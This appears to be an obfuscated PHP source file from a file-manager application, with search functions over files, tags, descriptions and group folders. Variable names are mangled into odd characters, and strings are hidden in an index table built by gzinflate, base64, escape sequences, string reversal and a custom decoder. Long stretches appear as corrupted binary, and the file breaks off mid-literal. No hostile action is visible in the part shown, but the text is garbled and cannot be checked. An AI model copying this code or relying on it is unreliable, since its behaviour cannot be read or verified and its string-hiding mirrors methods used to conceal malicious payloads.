$ä³×Ø÷¡ = $‘¹àÉîÓ; $this->_listSearchBindPinyin($¹ß÷øòÉ, $¾şŞôâ¥, $‘¹àÉîÓ); $this->alias($Ü¾òÅã[455])->_makeOrder(); $¾şŞôâ¥ = $this->parseWhereLike($¾şŞôâ¥); $Ò’ õ—å = $this->distinct(!0)->field($‘¹àÉîÓ)->where($¾şŞôâ¥)->selectPage($ù¥àÜ); if ($GLOBALS[$Ü¾òÅã[6]][$Ü¾òÅã[390]][$Ü¾òÅã[391]] && Input::check($¹ß÷øòÉ[$Ü¾òÅã[1946]], $Ü¾òÅã[592]) && $Ò’ õ—å[$Ü¾òÅã[376]][$Ü¾òÅã[363]] == 1 && $Ò’ õ—å[$Ü¾òÅã[376]][$Ü¾òÅã[377]] == 0) { $Ò’ õ—å = $this->distinct(!0)->field($‘¹àÉîÓ)->where($Š²ÖäÛ¶)->limit(1000)->select(); $Ò’ õ—å = array_page_split($Ò’ õ—å, !1, $ù¥àÜ); } $this->_listSearchFileContent($Ò’ õ—å, $¹ß÷øòÉ, $ä³×Ø÷¡, $Š²ÖäÛ¶); $this->_listSearchDesc($Ò’ õ—å, $¹ß÷øòÉ, $ä³×Ø÷¡); $this->_listSearchTag($Ò’ õ—å, $¹ß÷øòÉ, $ä³×Ø÷¡); $this->_listSearchGroupTag($Ò’ õ—å, $¹ß÷øòÉ, $ä³×Ø÷¡); $this->_listDataApply($Ò’ õ—å[$Ü¾òÅã[379]]); $this->_listMake($Ò’ õ—å); return $Ò’ õ—å; } private function _listSearchFileContent(&$êĞÇ†ş, $èº¢ò¾, $›ç’Ë¾£, $³Üçº¯ü) { $£ çîÈĞ =& $_SERVER[Å¶¨Şêº]; if (!$èº¢ò¾[$£ çîÈĞ[1946]] || $êĞÇ†ş[$£ çîÈĞ[376]][$£ çîÈĞ[363]] > 1) { return; } if (!isset($³Üçº¯ü[$£ çîÈĞ[42]]) || !is_array($èº¢ò¾[$£ çîÈĞ[477]])) { return; } $³Üçº¯ü[$£ çîÈĞ[477]] = array($£ çîÈĞ[7], $èº¢ò¾[$£ çîÈĞ[477]]); unset($³Üçº¯ü[$£ çîÈĞ[42]]); unset($èº¢ò¾[$£ çîÈĞ[477]]); $»Ÿç¾— = $this->field($›ç’Ë¾£)->where($³Üçº¯ü)->limit($£ çîÈĞ[2110])->select(); if (!$»Ÿç¾— || count($»Ÿç¾—) == 0) { return; } $êĞÇ†ş[$£ çîÈĞ[379]] = array_merge($»Ÿç¾—, $êĞÇ†ş[$£ çîÈĞ[379]]); $êĞÇ†ş[$£ çîÈĞ[376]][$£ çîÈĞ[377]] += count($»Ÿç¾—); } private function _listSearchTag(&$Õ°—ƒ§, $ÔØ®óÄß, $Ôåû½ÉÌ) { $Í£‹¥ù› =& $_SERVER[Å¶¨Şêº]; if (!$ÔØ®óÄß[$Í£‹¥ù›[1946]] || $Õ°—ƒ§[$Í£‹¥ù›[376]][$Í£‹¥ù›[363]] > 1) { return; } $¼ìè÷¢ = Model($Í£‹¥ù›[2111])->listData(); $•‹“”Ğ = array(); $ş¶¿Øé = $ÔØ®óÄß[$Í£‹¥ù›[1946]]; foreach ($¼ìè÷¢ as $«İ·Ù­é) { $ò£ıÆ†Ş = $«İ·Ù­é[$Í£‹¥ù›[42]]; $…’Ú°Ì = str_replace($Í£‹¥ù›[63], $Í£‹¥ù›[12], Pinyin::get($ò£ıÆ†Ş)); if (stripos($ò£ıÆ†Ş, $ş¶¿Øé) !== !1 || stripos($…’Ú°Ì, $ş¶¿Øé) !== !1) { $•‹“”Ğ[] = $«İ·Ù­é[$Í£‹¥ù›[408]]; } } if (!$•‹“”Ğ) { return; } $ùíïÖ— = array($Í£‹¥ù›[435] => array($Í£‹¥ù›[7], $•‹“”Ğ), $Í£‹¥ù›[1663] => USER_ID); $½×’ø‘á = Model($Í£‹¥ù›[437])->field($Í£‹¥ù›[95])->where($ùíïÖ—)->select(); $½×’ø‘á = array_to_keyvalue($½×’ø‘á, $Í£‹¥ù›[12], $Í£‹¥ù›[95]); $³ö—çÌ¦ = array_unique($½×’ø‘á); $this->_listSearchMerge($Õ°—ƒ§, $ÔØ®óÄß, $Ôåû½ÉÌ, $³ö—çÌ¦); } private function _listSearchDesc(&$ûğÈï§, $ÆËÎšıÇ, $¾Ê÷¸Ë€) { $»ë¯¯§¾ =& $_SERVER[Å¶¨Şêº]; if (!$ÆËÎšıÇ[$»ë¯¯§¾[1946]] || $ûğÈï§[$»ë¯¯§¾[376]][$»ë¯¯§¾[363]] > 1) { return; } $îÃÂÀşŸ = array($»ë¯¯§¾[105] => $»ë¯¯§¾[462], $»ë¯¯§¾[384] => array($»ë¯¯§¾[392], $»ë¯¯§¾[1948] . $ÆËÎšıÇ[$»ë¯¯§¾[1946]] . $»ë¯¯§¾[1948])); $şˆÈ±ìË = !1; if ($şˆÈ±ìË) { $åÅ™¯áÛ = $this->listSearchChildren($ÆËÎšıÇ[$»ë¯¯§¾[441]]); $åÅ™¯áÛ = array_unique($åÅ™¯áÛ); if (!$åÅ™¯áÛ) { return; } $îÃÂÀşŸ[$»ë¯¯§¾[411]] = array($»ë¯¯§¾[7], $åÅ™¯áÛ); } $Ù»•ê˜ñ = Model($»ë¯¯§¾[569])->field($»ë¯¯§¾[411])->where($îÃÂÀşŸ)->limit(5000)->select(); $°×¡øóÂ = array_to_keyvalue($Ù»•ê˜ñ, $»ë¯¯§¾[12], $»ë¯¯§¾[411]); $this->_listSearchMerge($ûğÈï§, $ÆËÎšıÇ, $¾Ê÷¸Ë€, $°×¡øóÂ); } private function _listSearchGroupTag(&$ÕÅÑÛ¹, $¤Î“€è“, $è™™ø±) { $şËãŠİ» =& $_SERVER[Å¶¨Şêº]; if (!$¤Î“€è“[$şËãŠİ»[1946]] || $ÕÅÑÛ¹[$şËãŠİ»[376]][$şËãŠİ»[363]] > 1 || !$¤Î“€è“[$şËãŠİ»[441]]) { return; } $ÅêŒç¦Š = $this->sourceInfo($¤Î“€è“[$şËãŠİ»[441]]); if (!$ÅêŒç¦Š || $ÅêŒç¦Š[$şËãŠİ»[420]] != SourceModel::TYPE_GROUP) { return; } $Ë­êş• = $ÅêŒç¦Š[$şËãŠİ»[505]]; $¯îéô‡È = Model($şËãŠİ»[2112])->get($Ë­êş•); $øøüÃ“Ì = array(); $ÑïÉÕ½Ğ = $¤Î“€è“[$şËãŠİ»[1946]]; foreach ($¯îéô‡È[$şËãŠİ»[379]] as $Ì‰Ù¨ÀÃ) { $¦„É•‚ = $Ì‰Ù¨ÀÃ[$şËãŠİ»[42]]; $ŠÆé†šŸ = str_replace($şËãŠİ»[63], $şËãŠİ»[12], Pinyin::get($¦„É•‚)); if (stripos($¦„É•‚, $ÑïÉÕ½Ğ) !== !1 || stripos($ŠÆé†šŸ, $ÑïÉÕ½Ğ) !== !1) { $øøüÃ“Ì[] = $Ì‰Ù¨ÀÃ[$şËãŠİ»[408]]; } } if (!$øøüÃ“Ì) { return; } $‡¯ÌÚÄ’ = array($şËãŠİ»[435] => array($şËãŠİ»[7], $øøüÃ“Ì), $şËãŠİ»[1663] => 0, $şËãŠİ»[43] => $şËãŠİ»[1968] . $Ë­êş•); $ßÚàğÙä = Model($şËãŠİ»[437])->field($şËãŠİ»[95])->where($‡¯ÌÚÄ’)->select(); $ßÚàğÙä = array_to_keyvalue($ßÚàğÙä, $şËãŠİ»[12], $şËãŠİ»[95]); $´…ÜñÇ = array_unique($ßÚàğÙä); $this->_listSearchMerge($ÕÅÑÛ¹, $¤Î“€è“, $è™™ø±, $´…ÜñÇ); } private function _listSearchMerge(&$ïü·²¦, $¤œÉÄæ§, $‘—šÍ , $õİ©™‰Ğ) { $¾ò¡ıŠí =& $_SERVER[Å¶¨Şêº]; if (!$õİ©™‰Ğ) { return; } $¿Ùšà÷à = array_to_keyvalue($ïü·²¦[$¾ò¡ıŠí[379]], $¾ò¡ıŠí[12], $¾ò¡ıŠí[411]); $ñû™õ€´ = array_diff($õİ©™‰Ğ, $¿Ùšà÷à); if (!$ñû™õ€´) { return; } $€Š™úÁ³ = array($¾ò¡ıŠí[411] => array($¾ò¡ıŠí[7], $ñû™õ€´)); $¨ä¸ñÁÔ = $this->field($‘—šÍ )->where($€Š™úÁ³)->select(); if (!$¨ä¸ñÁÔ) { return; } $şú¢ò± = array(); foreach ($¨ä¸ñÁÔ as $ãÒÛŠ®) { if ($this->_listSearchFilter($ãÒÛŠ®, $¤œÉÄæ§)) { $şú¢ò±[] = $ãÒÛŠ®; } } $ïü·²¦[$¾ò¡ıŠí[379]] = array_merge($şú¢ò±, $ïü·²¦[$¾ò¡ıŠí[379]]); $ïü·²¦[$¾ò¡ıŠí[376]][$¾ò¡ıŠí[377]] += count($şú¢ò±); } private function _listSearchFilter($œ‹Ë¹ı€, $Ï‚±‘‘ı) { $ŞìšÉâ =& $_SERVER[Å¶¨Şêº]; $§¹‡ÁÊ© = $œ‹Ë¹ı€[$ŞìšÉâ[419]] == $ŞìšÉâ[99]; if (!strstr($œ‹Ë¹ı€[$ŞìšÉâ[520]], $ŞìšÉâ[60] . $Ï‚±‘‘ı[$ŞìšÉâ[441]] . $ŞìšÉâ[60])) { return !1; } if (isset($Ï‚±‘‘ı[$ŞìšÉâ[421]]) && $Ï‚±‘‘ı[$ŞìšÉâ[421]] != $ŞìšÉâ[1907]) { if ($Ï‚±‘‘ı[$ŞìšÉâ[421]] == $ŞìšÉâ[86] && !$§¹‡ÁÊ©) { return !1; } if ($Ï‚±‘‘ı[$ŞìšÉâ[421]] != $ŞìšÉâ[86] && $§¹‡ÁÊ©) { return !1; } if (!strstr($œ‹Ë¹ı€[$ŞìšÉâ[185]], $ŞìšÉâ[60] . $Ï‚±‘‘ı[$ŞìšÉâ[421]] . $ŞìšÉâ[60])) { return !1; } } if (isset($Ï‚±‘‘ı[$ŞìšÉâ[2113]]) && $Ï‚±‘‘ı[$ŞìšÉâ[2113]] < $œ‹Ë¹ı€[$ŞìšÉâ[87]]) { return !1; } if (isset($Ï‚±‘‘ı[$ŞìšÉâ[2114]]) && $Ï‚±‘‘ı[$ŞìšÉâ[2114]] > $œ‹Ë¹ı€[$ŞìšÉâ[87]]) { return !1; } if (isset($Ï‚±‘‘ı[$ŞìšÉâ[599]]) && $Ï‚±‘‘ı[$ŞìšÉâ[599]] != $œ‹Ë¹ı€[$ŞìšÉâ[465]]) { return !1; } return !0; } public function listSearchChildren($£ÍÔ³†, $ñ½¼Ê’´ = 5000) { $›ŒĞß¢ =& $_SERVER[Å¶¨Şêº]; $°šº×§ = array(); $¤çÁŞÌ‹ = $this->sourceInfo($£ÍÔ³†); $¨üï‘É½ = array($›ŒĞß¢[520] => array($›ŒĞß¢[392], $¤çÁŞÌ‹[$›ŒĞß¢[520]] . $¤çÁŞÌ‹[$›ŒĞß¢[411]] . $›ŒĞß¢[550])); $£Ä°ôç = $this->field($›ŒĞß¢[87])->where($¨üï‘É½)->limit($ñ½¼Ê’´ + 1)->select(); $¹ì“Şƒç = is_array($£Ä°ôç) ? count($£Ä°ôç) : 0; if ($¹ì“Şƒç > $ñ½¼Ê’´) { return $this->_listSearchChildrenNear($£ÍÔ³†, $ñ½¼Ê’´); } $Íİ†ÑÖ = $this->field($›ŒĞß¢[411])->where($¨üï‘É½)->select(); $°šº×§ = array_to_keyvalue($Íİ†ÑÖ, $›ŒĞß¢[12], $›ŒĞß¢[411]); return $°šº×§; } private function _listSearchChildrenNear($ÍŸğê, $ËË’şäû) { $²£ŞÎ¿ =& $_SERVER[Å¶¨Şêº]; $«´Ï­Ê± = array(); $¶ º = array($²£ŞÎ¿[441] => $ÍŸğê); $„ÁÂš = $this->field($²£ŞÎ¿[2115])->where($¶ º)->select(); $–“Ïüè = array_to_keyvalue(array_filter_by_field($„ÁÂš, $²£ŞÎ¿[419], $²£ŞÎ¿[99]), $²£ŞÎ¿[12], $²£ŞÎ¿[411]); $«´Ï­Ê± = array_merge($«´Ï­Ê±, array_to_keyvalue($„ÁÂš, $²£ŞÎ¿[12], $²£ŞÎ¿[411])); if (!$–“Ïüè) { return $«´Ï­Ê±; } $¶ º = array($²£ŞÎ¿[441] => array($²£ŞÎ¿[7], $–“Ïüè)); $„ÁÂš = $this->field($²£ŞÎ¿[2115])->where($¶ º)->limit($ËË’şäû)->select(); $«´Ï­Ê± = array_merge($«´Ï­Ê±, array_to_keyvalue($„ÁÂš, $²£ŞÎ¿[12], $²£ŞÎ¿[411])); $«´Ï­Ê± = array_slice($«´Ï­Ê±, 0, $ËË’şäû); return $«´Ï­Ê±; } private function _listSearchBindPinyin($Ï ×†ûî, &$˜’¢ÍÒÆ, &$œ–¢µüú) { $™€“œó =& $_SERVER[Å¶¨Şêº]; if (!isset($Ï ×†ûî[$™€“œó[1946]]) || !$Ï ×†ûî[$™€“œó[1946]]) { return; } if (!Input::check($Ï ×†ûî[$™€“œó[1946]], $™€“œó[328]) || strlen($Ï ×†ûî[$™€“œó[1946]]) < 2) { return; } $åáéÜå‚ = "\x4c\105\x46\124\x20\112\117\x49\x4e\x20{$this->tablePrefix}\151\157\x5f\163\157\x75\x72\143\145\x5f\155\x65\164\141\40\155\145\164\141\40\x6f\156\40\x73\x6f\x75\x72\143\145\56\x73\x6f\x75\162\x63\x65\x49\104\x20\x3d\x20\x6d\x65\x74\x61\x2e\163\157\x75\x72\x63\145\x49\104"; $ıÓ¯ë³å = array(); $œ–¢µüú = str_replace(array($™€“œó[19], $™€“œó[63], $™€“œó[2116]), $™€“œó[12], $œ–¢µüú); $œ–¢µüú = $™€“œó[447] . str_replace($™€“œó[60], $™€“œó[448], $œ–¢µüú); $ÑğÏ†ƒÇ = $˜’¢ÍÒÆ[$™€“œó[42]]; unset($˜’¢ÍÒÆ[$™€“œó[42]]); foreach ($˜’¢ÍÒÆ as $Ò±¼Øû” => $Ù¼‘ŒŞè) { $ıÓ¯ë³å[$™€“œó[447] . $Ò±¼Øû”] = $Ù¼‘ŒŞè; } foreach ($ÑğÏ†ƒÇ as $ş™©İå) { $ıÓ¯ë³å[] = array($™€“œó[452] => $ş™©İå, $™€“œó[997] => $™€“œó[1950], array($™€“œó[2117] => $ş™©İå, $™€“œó[2118] => array($™€“œó[7], array($™€“œó[474], $™€“œó[473])))); } $this->join($åáéÜå‚); $˜’¢ÍÒÆ = $ıÓ¯ë³å; } private function _parseSearchWhere($Ä ıú¶©) { $äªòüØ =& $_SERVER[Å¶¨Şêº]; $Äâ¹ˆÜı = array(); if (isset($Ä ıú¶©[$äªòüØ[758]]) && $Ä ıú¶©[$äªòüØ[758]]) { $Äâ¹ˆÜı[$äªòüØ[96]] = array($äªòüØ[2119], $Ä ıú¶©[$äªòüØ[758]]); } if (isset($Ä ıú¶©[$äªòüØ[759]]) && $Ä ıú¶©[$äªòüØ[759]]) { $ÂÃ±êü¨ = array($äªòüØ[2120], $Ä ıú¶©[$äªòüØ[759]]); if ($Äâ¹ˆÜı[$äªòüØ[96]]) { $Äâ¹ˆÜı[$äªòüØ[96]] = array($Äâ¹ˆÜı[$äªòüØ[96]], $ÂÃ±êü¨, $äªòüØ[2121]); } else { $Äâ¹ˆÜı[$äªòüØ[96]] = $ÂÃ±êü¨; } } if (isset($Ä ıú¶©[$äªòüØ[2113]]) && $Ä ıú¶©[$äªòüØ[2113]] > 0) { $Äâ¹ˆÜı[$äªòüØ[87]] = array($äªòüØ[2119], $Ä ıú¶©[$äªòüØ[2113]]); } if (isset($Ä ıú¶©[$äªòüØ[2114]]) && $Ä ıú¶©[$äªòüØ[2114]]) { $ÂÃ±êü¨ = array($äªòüØ[2120], $Ä ıú¶©[$äªòüØ[2114]]); if ($Äâ¹ˆÜı[$äªòüØ[87]]) { $Äâ¹ˆÜı[$äªòüØ[87]] = array($Äâ¹ˆÜı[$äªòüØ[87]], $ÂÃ±êü¨, $äªòüØ[2121]); } else { $Äâ¹ˆÜı[$äªòüØ[87]] = $ÂÃ±êü¨; } } if (isset($Ä ıú¶©[$äªòüØ[599]]) && $Ä ıú¶©[$äªòüØ[599]]) { $Äâ¹ˆÜı[] = array($äªòüØ[465] => $Ä ıú¶©[$äªòüØ[599]], $äªòüØ[463] => $Ä ıú¶©[$äªòüØ[599]], $äªòüØ[997] => $äªòüØ[1950]); } if (isset($Ä ıú¶©[$äªòüØ[421]]) && $Ä ıú¶©[$äªòüØ[421]]) { $óÎİÏÃˆ = $Ä ıú¶©[$äªòüØ[421]]; if ($óÎİÏÃˆ == $äªòüØ[86]) { $Äâ¹ˆÜı[$äªòüØ[419]] = 1; } else { if ($óÎİÏÃˆ == $äªòüØ[2122]) { $Äâ¹ˆÜı[$äªòüØ[419]] = 0; } else { if ($óÎİÏÃˆ) { $óÎİÏÃˆ = is_array($óÎİÏÃˆ) ? $óÎİÏÃˆ : explode($äªòüØ[60], $óÎİÏÃˆ); $Äâ¹ˆÜı[$äªòüØ[421]] = array($äªòüØ[427], $óÎİÏÃˆ); $Äâ¹ˆÜı[$äªòüØ[419]] = 0; } } } } $this->_parseSearchParent($Ä ıú¶©, $Äâ¹ˆÜı); if (isset($Ä ıú¶©[$äªòüØ[1946]]) && trim($Ä ıú¶©[$äªòüØ[1946]])) { $ä¤§–Î“ = trim($Ä ıú¶©[$äªòüØ[1946]]); $çë¾¹ÁØ = explode($äªòüØ[63], $ä¤§–Î“); if (strlen($ä¤§–Î“) > 2 && (substr($ä¤§–Î“, 0, 1) == $äªòüØ[129] && substr($ä¤§–Î“, -1) == $äªòüØ[129]) || substr($ä¤§–Î“, 0, 1) == $äªòüØ[68] && substr($ä¤§–Î“, -1) == $äªòüØ[68]) { $ä¤§–Î“ = substr($ä¤§–Î“, 1, -1); $çë¾¹ÁØ = array($ä¤§–Î“); } $Äâ¹ˆÜı[$äªòüØ[42]] = array(array($äªòüØ[549], $äªòüØ[1948] . $ä¤§–Î“ . $äªòüØ[1948])); if (count($çë¾¹ÁØ) > 1) { $Äâ¹ˆÜı[$äªòüØ[42]] = array(); foreach ($çë¾¹ÁØ as $Á’äî²è) { if (!trim($Á’äî²è)) { continue; } $Äâ¹ˆÜı[$äªòüØ[42]][] = array($äªòüØ[549], $äªòüØ[1948] . trim($Á’äî²è) . $äªòüØ[1948]); } } } return $Äâ¹ˆÜı; } private function _parseSearchParent($š¼Ñ±Â†, &$èš‘‹¥§) { $¾ì€×èŒ =& $_SERVER[Å¶¨Şêº]; if (!isset($š¼Ñ±Â†[$¾ì€×èŒ[441]]) || !$š¼Ñ±Â†[$¾ì€×èŒ[441]]) { return; } $Ü·ŒÏ¯¡ = $this->pathInfo($š¼Ñ±Â†[$¾ì€×èŒ[441]]); $ğ…¥ñ®É = $Ü·ŒÏ¯¡[$¾ì€×èŒ[441]] . $¾ì€×èŒ[12] === $¾ì€×èŒ[209]; $Ô»·ÉÏ = $Ü·ŒÏ¯¡[$¾ì€×èŒ[420]] == $¾ì€×èŒ[514]; if ($Ü·ŒÏ¯¡[$¾ì€×èŒ[531]] == $¾ì€×èŒ[532]) { $÷ì¦†Šš = $this->sourceInfo($š¼Ñ±Â†[$¾ì€×èŒ[441]]); $Ü·ŒÏ¯¡[$¾ì€×èŒ[520]] = $÷ì¦†Šš[$¾ì€×èŒ[520]]; } $èš‘‹¥§[$¾ì€×èŒ[589]] = array($¾ì€×èŒ[549], $Ü·ŒÏ¯¡[$¾ì€×èŒ[520]] . $š¼Ñ±Â†[$¾ì€×èŒ[441]] . $¾ì€×èŒ[550]); $ü¢†ùØ = isset($š¼Ñ±Â†[$¾ì€×èŒ[1811]]) && in_array($¾ì€×èŒ[514], $š¼Ñ±Â†[$¾ì€×èŒ[1811]]); if (!$ü¢†ùØ || !$Ô»·ÉÏ || !$ğ…¥ñ®É || !$Ü·ŒÏ¯¡[$¾ì€×èŒ[422]]) { return; } if (!AuthModel::authCheckRoot($Ü·ŒÏ¯¡[$¾ì€×èŒ[422]][$¾ì€×èŒ[423]])) { return; } $œıœ±§ = $Ü·ŒÏ¯¡[$¾ì€×èŒ[505]] . $¾ì€×èŒ[12]; if ($œıœ±§ == $¾ì€×èŒ[99]) { unset($èš‘‹¥§[$¾ì€×èŒ[589]]); $èš‘‹¥§[$¾ì€×èŒ[420]] = self::TYPE_GROUP; return; } $÷İµ°â = Model($¾ì€×èŒ[521])->groupChildrenAll($œıœ±§); $â’Ààıâ = count($÷İµ°â); if ($â’Ààıâ <= 1) { return; } $à“êğÒá = array($¾ì€×èŒ[441] => 0, $¾ì€×èŒ[420] => self::TYPE_GROUP, $¾ì€×èŒ[505] => array($¾ì€×èŒ[7], $÷İµ°â)); $ö¤íÏ»½ = $this->field($¾ì€×èŒ[2123])->where($à“êğÒá)->limit($â’Ààıâ)->select(); $èš‘‹¥§[$¾ì€×èŒ[589]] = array(); foreach ($ö¤íÏ»½ as $…ëÒîË„) { $èš‘‹¥§[$¾ì€×èŒ[589]][] = array($¾ì€×èŒ[549], $¾ì€×èŒ[530] . $…ëÒîË„[$¾ì€×èŒ[411]] . $¾ì€×èŒ[550]); } $èš‘‹¥§[$¾ì€×èŒ[589]][] = $¾ì€×èŒ[1950]; } } goto AŸÕ°ÊêÇ; f¯š©ó‰ÁŠ: if (!function_exists('_kodDe')) { function _kodDe($str) { $str = base64_decode($str); $l = strlen($str); $result = ''; $offset = ord($str[0]) - 30; for ($i = 1; $i < $l; $i += 2) { if ($i + 1 < $l) { $result .= chr(ord($str[$i + 1]) + $offset); $result .= chr(ord($str[$i]) + $offset); } else { $result .= chr(ord($str[$i]) + $offset); } } return $result; } } define(strrev('ºêŞ¨¶Å'), "\356\243\223\362\276\220"); $_SERVER[Å¶¨Şêº] = explode(base64_decode('fAN8AXwC'), gzinflate(substr("\37\213\10\0\0\0\0\0\0\23\305\275\7\170\34\325\325\60\114\173\3\6\102\11\204\124\140\20\330\222\354\55\222\155\271\310\226\345\225\264\262\26\257\264\142\167\345\202"._kodDe('L7UTzJLdwKo32ipIiIokHyN1JK//wiN4MfVYasIU/g1zcPeZ/xX888NvN87v1hyIhQ==').base64_decode('XcH7P//3PB8P1s49t7dzzzn3nHNfueuC43/zxNqd1+64dqdLXvv9hlu302/0F/8j')."\xdf\x7\x9f\xbc\xdb\xe\xe4\xbf\xfd\x4e\x3e\xa9\xa6\xa6\x63\xce\xee\x33\xba\xf6\x3c\xf5\xc6\x6b\xb4\xcd\xda\x95\xda\x29\xb1\xe8\x63\x7f\x8a\x7c\xf7\x89\xab\xf\xf\x6f\xbb\xe4\xb1\xf1\x6d\x3b"."\356\360\337\207\354\31\215\50\61\315\333\110\177\224\202\351\50\372\230\141\73\66\5\244\314\302\240\221\241\337\106\201\376\6\351\117\117\74\152\351\171\323\321\151\60\100\177\124"."\xde\x2e\x1c\xd0\x6\x8d\x1c\xc4\xe3\x2f\xdb\x98\xd0\xe5\x98\x4\xa\x47\xa\x22\x5e\xcd\xe8\x8e\x8a\xaa\x74\xf4\x2\x6b\x40\x4b\x28\x11\x69\x55\xbb\x43\xc9\xe\x1a\xd6\x8a\xc5\xa0\x9d\x1e\xb6"."\x83\x9a\x95\xca\x1a\x23\x7a\xd4\x18\x8\xe\x18\x85\x60\x5a\x73\xb4\xc0\x0\x6b\xe2\xee\xf4\x67\x36\x74\x22\xab\xa7\x86\x55\x6d\xc0\xb4\x1c\x3d\x4d\x41\xa5\x42\xce\x28\xc\xd3\x6f\x7b\x75\xce".strrev(''."\r".'š±¸'."\0".'"‚õhµ8¹36[¨²4<´³QWÃLŞ|r+¡\'İÓÑ5Ib»P½`')."\45\265\265\250\155\341\356\150\154\245\232\134\331\35\206\24\3\352\352\222\156\215\323\20\371\114\70\232\345\44\215\274\316\123\214\132\274\135\55\341\45\221\56\45\31\17\165\45".strrev('Ú?KR•f4U”k4Q‡Mµ!%¡ãºcËK­B[F‹<9d‘c[‚‹¬HÉ­B')."\xd\x3d\x7\xc3\x58\xd0\x58\x73\x9c\xf1\x22\x7c\x25\xf9\x17\x5a\x4c\x85\x52\x2e\x47\x3\x5d\xfc\x2b\xad\xf\x6a\xa5\x1c\x8c\x56\x9b\x1c\x28\x5a\x46\x5e\x63\x9d\x5e\xaa\x8f\x73\x28\xcc\x7d\xc9"."\61\215\102\212\6\302\143\216\245\11\70\152\153\12\55\107\264\160\50\54\21\216\206\133\223\12\156\240\322\36\217\165\52\60\11\171\315\166\164\113\131\336\21\216\207\25\334\350"."\246\152\322\327\152\5\126\165\27\32\12\45\24\215\52\223\225\340\350\371\42\53\206\346\251\120\130\54\336\26\216\53\55\53\25\61\102\51\63\237\67\13\1\124\12\232\111\107"."\152\152\70\36\247\37\76\330\204\321\10\236\64\10\304\332\333\23\141\36\202\316\35\21\105\55\231\5\353\323\25\112\17\346\34\165\104\313\225\330\62\205\105\136\15\77\325\362"."\xfe\x34\x6d\x58\xc0\xab\x8d\x82\x51\x82\xc5\xa\x5\x99\x26\x47\x1\xf0\x51\x62\xa9\x75\x6\xd1\xd3\xf0\x91\x47\xf9\x4d\xc0\x12\x68\xff\x8e\xd0\xcf\xa6\x45\xf4\x77\x1\x24\x1a\xc0\x7b\x7b\x44"."\xb7\x1c\x55\x2f\xa4\xcc\xb4\x51\x0\xc4\xd2\xc\x4b\x4f\x73\xb2\x6d\x16\xda\xd3\x16\x60\x4\x33\x97\x66\xdf\x2\x73\x60\x3c\xd1\x55\xca\xcb\x49\x78\x10\x61\x84\x5c\xda\xd2\xb\xdf\x9e\x92\x6"."\xa3\x7c\xd3\xe2\xb4\x22\x54\x44\x2d\xe1\xfb\xdd\x18\x1c\x17\xbb\xe\xa7\xeb\xe6\xb1\xb6\x59\xb2\x52\x8\x83\xd\x42\xdf\xeb\x1\xac\x3b\xe\xea\x1c\x8c\x8d\x61\xf6\x14\x73\xa6\x96\x4e\xe8\x16"."\357\232\141\266\243\202\142\45\107\6\226\110\262\166\323\312\267\41\374\0\365\243\275\141\364\124\210\30\146\273\43\55\215\130\260\246\367\227\376\257\372\173\27\243\77\265\200\246"."\373\240\115\131\75\227\123\365\61\35\266\117\76\335\140\263\301\10\332\30\203\42\10\15\106\142\152\126\263\263\235\351\6\225\344\142\330\77\255\217\5\212\331\42\354\155\276\235"."\373\134\313\33\17\135\227\351\204\245\63\44\147\246\264\234\334\105\372\235\165\234\142\102\57\244\333\371\21\221\66\107\13\144\244\212\72\303\323\155\76\45\255\164\52\53\225\216"."\x46\xa3\xd1\x66\x19\xf3\x39\xfe\xc5\x7a\xc7\x61\x36\x7\x3a\x63\x6c\x3a\xd3\x83\xf4\x83\x9f\xf\x55\x50\xa1\x61\x13\x3c\x27\x36\x29\x3a\x5e\x72\x46\x4a\x73\xc\xb3\x10\x34\x53\x8e\xee\xf8\x6d".strrev('Í\\/Õkö°hÇåñér€é•c#,ÇõÎ\\¡üæe”\'Eoí¶éJ”1(5ÒÇ')._kodDe('L5XjIoGO1+W2PhBYXGr0pj9Q6wjH+XwbWXS2SBtQijwGr8pavCNDwLZIQTZ74DPOPA==')."\220\336\300\147\236\136\226\66\74\126\64\54\335\146\155\125\226\164\46\241\20\124\272\356\357\266\264\114\136\153\124\212\245\1\64\62\260\123\53\300\150\152\30\232\106\45\205\203"."\x3e\x25\x5f\xb2\x1d\xbf\xa5\x23\x84\x64\xa0\x43\xf\x6\x39\x32\xe8\xef\xc4\xfb\xca\xd0\xd3\xfe\x4\xc2\xdb\x0\x9e\x55\x37\x5b\x41\x4b\x47\x61\x71\x14\xda\x91\x4c\x76\xab\x91\x76\x74\x30\x77"."\x85\xd5\xce\x50\xb2\x15\x8\x81\xb0\xa3\x65\x58\x9b\xa3\x8\x1b\xf3\x22\x19\x70\x85\x1f\xed\x2f\xbc\xb8\xba\x50\x5f\x5\xb0\xdb\x1c\xd5\x2d\x54\x71\xcb\x78\xa3\x32\x6c\xa6\x7\xcc\xb1\x0\x8b".base64_decode('ageShCXG0110/HGtkMHjMzDu6LAE7ZGMe6CjeiHjZFnGRDi+LBxXE7H25PJQHI70')."\x2\x5a\x25\x63\xac\x2a\x5c\x74\xce\x1f\xd7\xd3\x68\xe8\x53\xe\xcb\xa7\x15\xf1\xa8\xb1\x34\x78\x73\xe0\xb9\x62\xb1\x78\xc3\xb0\xb8\x68\x64\x9\x1e\x98\x36\xbf\x8d\x12\xf9\xe5\x54\xac\xec\xa8"."\221\67\160\333\35\36\103\106\22\235\367\113\240\101\101\322\241\246\76\173\172\115\137\172\106\255\37\375\235\136\333\333\327\26\230\336\337\34\64\104\236\140\175\240\136\231\131\67"."\107\351\106\4\210\241\345\24\350\164\131\212\72\45\266\324\75\54\142\65\27\314\202\376\15\203\203\117\60\151\333\173\206\225\2\343\341\43\172\302\211\244\332\31\116\166\304\332".base64_decode('oPZwCL6iJt22rLe99KcfZref/qiG3S4dKzjI0Y9qDgyhyejUGY4dpDg6ktcyEpLH').base64_decode('UBzqNC3dDRFH1XIjzc8IFOzQjUwWxsvApaXMnGlpOYwZ2abQGbbKGICtAAmLQMLI').strrev('(c^fÓäèY‰ƒ÷†vÌêeƒ¿L'."\r".'Ù?&³¾Ä•£eIøw¶} 